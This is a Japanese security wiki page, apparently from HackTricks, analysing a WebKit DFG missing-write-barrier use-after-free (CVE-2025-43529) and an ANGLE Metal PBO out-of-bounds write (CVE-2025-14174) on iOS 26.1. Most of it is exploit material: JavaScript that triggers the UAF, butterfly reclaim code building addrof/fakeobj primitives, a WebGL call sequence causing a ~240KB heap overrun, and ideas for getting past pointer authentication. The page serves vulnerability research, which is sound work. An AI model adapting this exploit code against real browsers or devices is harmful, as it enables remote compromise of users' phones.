# WebKit DFG Store-Barrier UAF + ANGLE PBO OOB (iOS 26.1)

{{#include ../../banners/hacktricks-training.md}}

## 概要
- **DFG Store Barrier bug (CVE-2025-43529)**: `DFGStoreBarrierInsertionPhase.cpp` 内で、**Upsilon の入力がマークされていないのに Phi ノードだけが escaped とマークされる** と、そのフェーズがその後のオブジェクトストアに対して **write barrier の挿入をスキップ** してしまう。GC 圧力下でこれにより JSC がまだ到達可能なオブジェクトを解放してしまい → **use-after-free**。
- **Exploit target**: **Date** オブジェクトに butterfly を具現化させ（例: `a[0] = 1.1`）ことでその butterfly を解放させ、続いて配列要素ストレージとして再割り当て（reclaimed）させることで boxed/unboxed の混同を作り出し → `addrof`/`fakeobj` プリミティブを得る。
- **ANGLE Metal PBO bug (CVE-2025-14174)**: Metal バックエンドが PBO の staging buffer を実際のテクスチャ高さではなく `UNPACK_IMAGE_HEIGHT` を使って割り当てる。非常に小さい unpack height を指定してから大きな `texImage2D` を発行すると、**staging-buffer の OOB 書き込み**（下の PoC で約240KB）を引き起こす。
- **PAC blockers on arm64e (iOS 26.1)**: TypedArray の `m_vector` や JSArray の `butterfly` は PAC で署名されており、攻撃者が選んだポインタで fake object を作ると `EXC_BAD_ACCESS`/`EXC_ARM_PAC` でクラッシュする。既に署名済みの butterfly を再利用（boxed/unboxed の再解釈）する方法のみが有効。

## Triggering the DFG missing barrier → UAF
```js
function triggerUAF(flag, allocCount) {
const A = {p0: 0x41414141, p1: 1.1, p2: 2.2};
arr[arr_index] = A;                 // Tenure A in old space
const a = new Date(1111); a[0] = 1.1; // Force Date butterfly

// GC pressure
for (let j = 0; j < allocCount; ++j) forGC.push(new ArrayBuffer(0x800000));

const b = {p0: 0x42424242, p1: 1.1};
let f = b; if (flag) f = 1.1;       // Phi escapes, Upsilon not escaped
A.p1 = f;                           // Missing barrier state set up

for (let i = 0; i < 1e6; ++i) {}    // GC race window
b.p1 = a;                           // Store without barrier → frees `a`/butterfly
}
```
主なポイント:
- **A** を old space に置いて generational barriers を発動させる。
- インデックス付きの **Date** を作成して **butterfly** を解放対象にする。
- GC を強制してレースを広げるために `ArrayBuffer(0x800000)` を spray する。
- Phi/Upsilon の escape ミスマッチが barrier 挿入を止める；`b.p1 = a` は **without a write barrier** で実行されるため、GC が `a`/butterfly を回収する。

## Butterfly reclaim → boxed/unboxed の混乱
GC が Date butterfly を解放した後、配列を spray して、解放された slab が異なる element kinds を持つ 2 つの配列の要素として再利用されるようにする：
```js
boxed_arr[0]   = obj;          // store as boxed pointer
const addr     = ftoi(unboxed_arr[0]); // read as float64 → addr leak
unboxed_arr[0] = itof(addr);   // write pointer bits as float
const fake     = boxed_arr[0]; // reinterpret as object → fakeobj
```
Status on **iOS 26.1 (arm64e)**:
- **動作:** `addrof`, `fakeobj`, 1回の実行で20+ address leaks, inline-slot の読み書き（既知の inline fields に対して）。
- **まだ安定していない:** inline-slot backings を介した汎用的な `read64`/`write64`。

## PAC constraints on arm64e (why fake objects crash)
- **TypedArray `m_vector`** と **JSArray `butterfly`** は PAC で署名されている；ポインタを偽造すると `EXC_BAD_ACCESS` / おそらく `EXC_ARM_PAC` を引く。
- confusion primitive は、**正当な署名済み butterfly を再利用する**ために動作する；署名されていない攻撃者ポインタを導入すると認証に失敗する。
- 考えられるバイパス案: 認証をスキップする JIT パス、攻撃者ポインタに署名する gadgets、または ANGLE OOB を経由したピボット。

## ANGLE Metal PBO under-allocation → OOB write
小さな unpack height を使って staging buffer を縮小し、続けて大きな texture を upload すると copy がオーバーランする:
```js
gl.pixelStorei(gl.UNPACK_IMAGE_HEIGHT, 16);  // alloc height
// staging = 256 * 16 * 4 = 16KB
// actual  = 256 * 256 * 4 = 256KB → ~240KB OOB

gl.texImage2D(gl.TEXTURE_2D, 0, gl.DEPTH_COMPONENT32F,
256, 256, 0, gl.DEPTH_COMPONENT, gl.FLOAT, 0);
```
メモ:
- `TextureMtl.cpp`のバグ：staging bufferがPBOパスで実際のテクスチャ高さではなく`UNPACK_IMAGE_HEIGHT`を使用している。
- 参照されたprobeではWebGL2のPBOトリガーは組み込まれているが、iOS 26.1ではまだ安定して観測されていない。

## 参考資料
- [WebKit-UAF-ANGLE-OOB-Analysis](https://github.com/zeroxjf/WebKit-UAF-ANGLE-OOB-Analysis)
- [jir4vv1t/CVE-2025-43529](https://github.com/jir4vv1t/CVE-2025-43529)

{{#include ../../banners/hacktricks-training.md}}
